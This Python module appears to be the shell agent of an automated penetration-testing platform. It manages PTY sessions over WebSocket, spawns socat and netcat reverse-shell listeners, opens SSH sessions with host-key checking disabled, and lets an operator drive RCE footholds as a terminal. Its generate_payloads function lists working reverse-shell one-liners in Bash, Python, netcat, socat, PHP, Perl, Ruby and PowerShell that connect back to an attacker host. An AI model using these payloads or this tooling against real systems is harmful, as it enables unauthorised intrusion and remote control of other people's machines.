"""
KALI PENTEST PLATFORM v2 — Shell Agent
PTY process management. Routes I/O through WebSocket.

WS protocol:
  C→S: { type:"shell_input",  shell_id, data }
  C→S: { type:"shell_resize", shell_id, cols, rows }
  S→C: { type:"shell_output", shell_id, data }
  S→C: { type:"shell_status", shell_id, active, info }
"""

import asyncio, fcntl, os, pty, signal, struct, termios, time
from typing import Optional, Dict, List, Callable, Awaitable, Any
from datetime import datetime
import netifaces

from agents.base_agent import BaseAgent, BroadcastFn
from db.schemas import AgentName, AgentStatus, AttackPhase, WebSocketMessage
import db.mongo_client as db

OutputCallback = Callable[[str, str], Awaitable[None]]


class PtyShell:
    """PTY subprocess wrapper with async I/O."""

    def __init__(self, shell_id: str, on_output: OutputCallback):
        self.shell_id = shell_id
        self.on_output = on_output
        self.pid: Optional[int] = None
        self.master: Optional[int] = None
        self.active = False
        self._reader_task: Optional[asyncio.Task] = None
        self._cmd_history: List[Dict] = []
        self._buf = ""

    async def spawn(self, argv: List[str], cwd: str = "/tmp") -> bool:
        try:
            self.pid, self.master = pty.fork()
        except Exception as e:
            print(f"[PTY] fork failed: {e}")
            return False
        if self.pid == 0:
            try:
                os.chdir(cwd)
                os.execvp(argv[0], argv)
            except Exception:
                os._exit(1)
        else:
            self._set_winsize(220, 50)
            fl = fcntl.fcntl(self.master, fcntl.F_GETFL)
            fcntl.fcntl(self.master, fcntl.F_SETFL, fl | os.O_NONBLOCK)
            self.active = True
            self._reader_task = asyncio.create_task(self._read_loop())
        return True

    def _set_winsize(self, cols: int, rows: int):
        if self.master is None:
            return
        try:
            fcntl.ioctl(self.master, termios.TIOCSWINSZ,
                        struct.pack("HHHH", rows, cols, 0, 0))
        except Exception:
            pass

    async def resize(self, cols: int, rows: int):
        self._set_winsize(cols, rows)

    async def write(self, data: str):
        """B-10 — Robust non-blocking write with retry.

        The PTY master fd is set non-blocking (O_NONBLOCK), so when the
        kernel buffer fills up ``os.write`` raises ``BlockingIOError``
        (a subclass of OSError).  Treating that as fatal would close the
        shell on any large primer command (linpeas wrapper, b64-encoded
        payload, etc.).  Instead we:
          1. Catch BlockingIOError separately
          2. Yield to the event loop and retry up to N times with brief
             back-off so the read-loop can drain the buffer
          3. Only treat real fatal errors (EBADF, EPIPE, EIO) as a close
        """
        if not self.active or self.master is None:
            return
        if not data:
            return

        encoded = data.encode("utf-8", errors="replace")
        offset  = 0
        retries = 0
        MAX_RETRIES = 80      # ~8 s max wait at 100 ms back-off
        while offset < len(encoded):
            try:
                n = os.write(self.master, encoded[offset:])
                if n <= 0:
                    # Should not happen on success, but guard against it
                    break
                offset += n
            except BlockingIOError:
                # PTY buffer full — wait briefly and retry
                retries += 1
                if retries > MAX_RETRIES:
                    # Real backpressure stall — treat as soft failure
                    print(f"[PTY] write stalled after {MAX_RETRIES} retries on shell {self.shell_id}")
                    return
                await asyncio.sleep(0.1)
                continue
            except OSError as exc:
                # EBADF (9) / EPIPE (32) / EIO (5) are genuinely fatal
                if getattr(exc, "errno", None) in (5, 9, 32):
                    await self._on_close()
                    return
                # Anything else — log and bail without closing
                print(f"[PTY] write OSError errno={getattr(exc,'errno',None)} on {self.shell_id}: {exc}")
                return

        self._buf += data
        if "\r" in data or "\n" in data:
            cmd = self._buf.replace("\r", "").replace("\n", "").strip()
            if cmd:
                self._cmd_history.append({
                    "cmd": cmd, "output": "", "ts": datetime.utcnow().isoformat()
                })
            self._buf = ""

    async def _read_loop(self):
        loop = asyncio.get_event_loop()
        while self.active:
            try:
                data = await loop.run_in_executor(None, self._safe_read)
                if data is None:
                    await asyncio.sleep(0.01)
                    continue
                if data == b"":
                    await self._on_close()
                    break
                text = data.decode("utf-8", errors="replace")
                if self._cmd_history:
                    self._cmd_history[-1]["output"] += text
                await self.on_output(self.shell_id, text)
            except asyncio.CancelledError:
                break
            except Exception as e:
                if self.active:
                    print(f"[PTY] read err {self.shell_id}: {e}")
                await asyncio.sleep(0.05)

    def _safe_read(self) -> Optional[bytes]:
        if not self.active or self.master is None:
            return None
        try:
            return os.read(self.master, 4096)
        except BlockingIOError:
            return None
        except OSError:
            return b""

    async def _on_close(self):
        self.active = False
        if self.pid:
            try:
                os.waitpid(self.pid, os.WNOHANG)
            except Exception:
                pass
        await self.on_output(
            self.shell_id,
            "\r\n\x1b[31m[Shell session closed]\x1b[0m\r\n"
        )

    def terminate(self):
        self.active = False
        if self._reader_task:
            self._reader_task.cancel()
        if self.pid:
            try:
                os.kill(self.pid, signal.SIGTERM)
                time.sleep(0.1)
                os.kill(self.pid, signal.SIGKILL)
            except ProcessLookupError:
                pass
        if self.master is not None:
            try:
                os.close(self.master)
            except Exception:
                pass
            self.master = None

    @property
    def command_history(self) -> List[Dict]:
        return self._cmd_history


class ShellAgent(BaseAgent):
    """Manages a pool of PTY shells, routes I/O via WS broadcast."""

    def __init__(self, broadcast: Optional[BroadcastFn] = None):
        super().__init__(AgentName.SHELL, broadcast)
        self.phase = AttackPhase.POST_EXPLOIT
        self._shells: Dict[str, PtyShell] = {}
        # RCE-backed pseudo-shells: shell_id → {run_fn, buf, prompt, host, user}.
        # These have NO PTY — when the foothold is one-shot command execution
        # (e.g. a deserialization RCE PoC), the operator/human still drives it
        # from the GUI terminal: each typed line is run through run_fn (the RCE
        # channel) and the output is streamed back over shell_output.
        self._rce_consoles: Dict[str, Dict[str, Any]] = {}
        # Recommendation A — ShellAgent gets a back-reference to MasterAgent
        # so manual-capture paths (create_listener, connect_ssh) can flow
        # through register_shell and trip post-ex / privesc / lateral.
        # MasterAgent assigns this when it instantiates / receives a
        # ShellAgent reference (currently set in API layer); a None
        # _master means standalone use and the registration is skipped.
        self._master: Optional[Any] = None

    async def run(self, session_id: str, target: str, **kwargs) -> Dict:
        self._session_id = session_id
        await self.set_status(AgentStatus.IDLE, "Shell agent ready")
        return {"status": "ready"}

    # ── Shell lifecycle ──────────────────────────────────────────

    async def create_listener(
        self, session_id: str, shell_id: str, shell_type: str,
        lport: int, lhost: Optional[str] = None,
        rhost: str = "0.0.0.0", protocol: str = "tcp"
    ) -> Dict:
        """Start a PTY-backed reverse shell listener."""
        self._session_id = session_id
        lhost = lhost or self._get_lhost()

        if shell_type in ("reverse_shell", "socat"):
            argv = [
                "socat",
                f"TCP-LISTEN:{lport},reuseaddr,fork",
                "EXEC:/bin/bash -li,pty,stderr,setsid,sigint,sane",
            ]
            display_cmd = f"socat TCP-LISTEN:{lport},reuseaddr,fork EXEC:/bin/bash,pty,..."
        else:
            argv = ["nc", "-lvnp", str(lport)]
            display_cmd = f"nc -lvnp {lport}"

        pty_shell = PtyShell(shell_id, self._on_pty_output)
        success = await pty_shell.spawn(argv)
        if success:
            self._shells[shell_id] = pty_shell
            await db.update_shell_session(shell_id, {
                "active": True, "pid": pty_shell.pid, "lhost": lhost
            })
            await self.set_status(AgentStatus.RUNNING, f"Listener :{lport}")
            await self._emit("shell_status", {
                "shell_id": shell_id, "active": True,
                "info": {"pid": pty_shell.pid, "port": lport, "lhost": lhost}
            })
            # Listener spawn is OPTIMISTIC — we have no callback yet, so
            # post-ex / privesc / lateral must NOT fire on this call.  When
            # the callback actually arrives, ListenerManager.wait_for_session
            # calls register_shell with confirmed=True + real `uid=`/prompt
            # evidence and that's what flips shell_access.
            if self._master is not None:
                try:
                    await self._master.register_shell(
                        source     = "shell_agent:listener",
                        user       = "unknown",
                        host       = rhost or "",
                        method     = f"reverse_shell:{shell_type}",
                        evidence   = display_cmd,
                        session_id = shell_id,
                        rhost      = rhost,
                        rport      = lport,
                        confirmed  = False,
                    )
                except Exception:
                    pass
            return {"success": True, "shell_id": shell_id, "pid": pty_shell.pid,
                    "command": display_cmd, "lhost": lhost, "lport": lport}
        return {"success": False, "error": "PTY spawn failed"}

    async def connect_ssh(
        self, session_id: str, shell_id: str, host: str, port: int,
        username: str, password: Optional[str] = None, key_file: Optional[str] = None
    ) -> Dict:
        """Open SSH session as interactive PTY."""
        self._session_id = session_id
        if password:
            argv = ["sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no",
                    "-p", str(port), f"{username}@{host}"]
        elif key_file:
            argv = ["ssh", "-o", "StrictHostKeyChecking=no", "-i", key_file,
                    "-p", str(port), f"{username}@{host}"]
        else:
            argv = ["ssh", "-o", "StrictHostKeyChecking=no",
                    "-p", str(port), f"{username}@{host}"]

        pty_shell = PtyShell(shell_id, self._on_pty_output)
        success = await pty_shell.spawn(argv)
        if success:
            self._shells[shell_id] = pty_shell
            await db.update_shell_session(shell_id, {
                "active": True, "pid": pty_shell.pid, "shell_user": username
            })
            await self._emit("shell_status", {
                "shell_id": shell_id, "active": True, "info": {"host": host, "user": username}
            })
            # Recommendation A — SSH-in is a foothold the post-ex / privesc
            # / lateral phases must see.  Skipped silently when no master
            # back-reference is set (standalone API-only use).
            if self._master is not None:
                try:
                    await self._master.register_shell(
                        source     = "shell_agent:ssh",
                        user       = username or "unknown",
                        host       = host,
                        method     = "ssh",
                        evidence   = f"SSH session as {username}@{host}:{port}",
                        session_id = shell_id,
                        rhost      = host,
                        rport      = port,
                    )
                except Exception:
                    pass
            return {"success": True, "shell_id": shell_id, "pid": pty_shell.pid}
        return {"success": False, "error": "SSH spawn failed"}

    async def create_rce_console(
        self, session_id: str, shell_id: str, *, run_fn: Callable,
        host: str = "", user: str = "", label: str = "RCE",
    ) -> Dict:
        """Register an RCE-backed console — a GUI terminal with no PTY whose
        typed commands run through ``run_fn`` (the foothold's RCE channel) and
        whose output streams back over ``shell_output``.  Lets the human drive a
        one-shot RCE foothold from ARGUS just like an interactive shell."""
        self._session_id = session_id
        prompt = f"\x1b[92m{user or 'rce'}@{host or 'target'}\x1b[0m$ "
        self._rce_consoles[shell_id] = {
            "run_fn": run_fn, "buf": "", "prompt": prompt, "host": host, "user": user}
        try:
            await db.update_shell_session(shell_id, {"active": True, "shell_user": user})
        except Exception:
            pass
        await self._emit("shell_status", {
            "shell_id": shell_id, "active": True,
            "info": {"host": host, "user": user, "type": "rce_console"}})
        banner = ("\x1b[96m╔══ ARGUS RCE Console ══╗\x1b[0m\r\n"
                  f"Commands you type run on \x1b[1m{user or 'target'}@{host or '?'}\x1b[0m "
                  "through the foothold's RCE channel (request/response, not a live TTY).\r\n"
                  "Type a command and press Enter. 'exit' closes the console.\r\n\r\n" + prompt)
        await self._on_pty_output(shell_id, banner)
        return {"success": True, "shell_id": shell_id, "type": "rce_console"}

    # ── Real-time I/O ────────────────────────────────────────────

    async def handle_input(self, shell_id: str, data: str):
        """Route WS shell_input → PTY stdin (or → RCE console runner)."""
        rce = self._rce_consoles.get(shell_id)
        if rce is not None:
            await self._rce_console_input(shell_id, rce, data)
            return
        shell = self._shells.get(shell_id)
        if shell and shell.active:
            await shell.write(data)
        elif self.broadcast and self._session_id:
            msg = WebSocketMessage(
                type="shell_output", session_id=self._session_id, agent=self.name,
                data={"shell_id": shell_id, "data": "\r\n\x1b[31m[Not connected]\x1b[0m\r\n"}
            )
            await self.broadcast(msg)

    async def _rce_console_input(self, shell_id: str, rce: Dict[str, Any], data: str) -> None:
        """Echo keystrokes + run the line through the RCE channel on Enter."""
        for ch in data:
            if ch in ("\r", "\n"):
                cmd = rce["buf"].strip()
                rce["buf"] = ""
                await self._on_pty_output(shell_id, "\r\n")
                if not cmd:
                    await self._on_pty_output(shell_id, rce["prompt"])
                    continue
                if cmd in ("exit", "quit"):
                    self._rce_consoles.pop(shell_id, None)
                    await self._on_pty_output(shell_id, "\x1b[90m[RCE console closed]\x1b[0m\r\n")
                    return
                await self._on_pty_output(shell_id, "\x1b[90m[running…]\x1b[0m\r\n")
                try:
                    out = await rce["run_fn"](cmd)
                except Exception as exc:   # noqa: BLE001
                    out = f"[console error] {type(exc).__name__}: {exc}"
                out = (str(out) or "(no output)").replace("\r\n", "\n").replace("\n", "\r\n")
                await self._on_pty_output(shell_id, out.rstrip("\r\n") + "\r\n" + rce["prompt"])
            elif ch in ("\x7f", "\b"):
                if rce["buf"]:
                    rce["buf"] = rce["buf"][:-1]
                    await self._on_pty_output(shell_id, "\b \b")
            elif ch == "\x03":   # Ctrl-C — clear the current line
                rce["buf"] = ""
                await self._on_pty_output(shell_id, "^C\r\n" + rce["prompt"])
            elif ch >= " ":
                rce["buf"] += ch
                await self._on_pty_output(shell_id, ch)   # local echo

    async def resize_shell(self, shell_id: str, cols: int, rows: int):
        s = self._shells.get(shell_id)
        if s:
            await s.resize(cols, rows)

    async def upgrade_shell(self, shell_id: str) -> str:
        """Send TTY stabilisation commands."""
        s = self._shells.get(shell_id)
        if not s:
            return "Shell not found"
        for cmd in [
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\r",
            "export TERM=xterm-256color\r",
            "stty rows 50 cols 220\r",
        ]:
            await s.write(cmd)
            await asyncio.sleep(0.3)
        return "Upgrade commands sent"

    async def terminate_shell(self, shell_id: str):
        self._rce_consoles.pop(shell_id, None)
        s = self._shells.pop(shell_id, None)
        if s:
            s.terminate()
        await db.update_shell_session(shell_id, {
            "active": False, "closed_at": datetime.utcnow()
        })
        await self._emit("shell_status", {"shell_id": shell_id, "active": False, "info": {}})

    def get_shell_history(self, shell_id: str) -> List[Dict]:
        s = self._shells.get(shell_id)
        return s.command_history if s else []

    # ── Internal ─────────────────────────────────────────────────

    async def _on_pty_output(self, shell_id: str, data: str):
        if self.broadcast and self._session_id:
            msg = WebSocketMessage(
                type="shell_output", session_id=self._session_id, agent=self.name,
                data={"shell_id": shell_id, "data": data}
            )
            try:
                await self.broadcast(msg)
            except Exception as e:
                print(f"[SHELL] broadcast err: {e}")

    def _get_lhost(self) -> str:
        try:
            for iface in netifaces.interfaces():
                if iface == "lo":
                    continue
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ip = addrs[netifaces.AF_INET][0].get("addr", "")
                    if ip and not ip.startswith("127."):
                        return ip
        except Exception:
            pass
        return "127.0.0.1"

    @staticmethod
    def generate_payloads(lhost: str, lport: int) -> List[Dict]:
        return [
            {"label": "Bash TCP",
             "cmd": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"},
            {"label": "Python3",
             "cmd": (f"python3 -c \'import socket,subprocess,os;"
                     f"s=socket.socket();s.connect((\"\"{lhost}\"\",{lport}));"
                     "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                     "os.dup2(s.fileno(),2);"
                     "subprocess.call([\"\"/bin/sh\"\",\"\"-i\"\"])\'")},
            {"label": "Netcat mkfifo",
             "cmd": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"},
            {"label": "Socat PTY",
             "cmd": f"socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"},
            {"label": "PHP",
             "cmd": f"php -r \'$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");\'"},
            {"label": "Perl",
             "cmd": (f"perl -e \'use Socket;$i=\"{lhost}\";$p={lport};"
                     "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                     "if(connect(S,sockaddr_in($p,inet_aton($i))))"
                     "{open(STDIN,\">&S\");open(STDOUT,\">&S\");"
                     "open(STDERR,\">&S\");exec(\"/bin/sh -i\");}\'")},
            {"label": "Ruby",
             "cmd": (f"ruby -rsocket -e\'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
                     "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)\'")},
            {"label": "PowerShell",
             "cmd": (f"$c=New-Object Net.Sockets.TCPClient(\"{lhost}\",{lport});"
                     "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
                     "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
                     "{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                     "$r=(iex $d 2>&1|Out-String);"
                     "$rb=([Text.Encoding]::ASCII).GetBytes($r+\"PS> \");"
                     "$s.Write($rb,0,$rb.Length)}")},
        ]
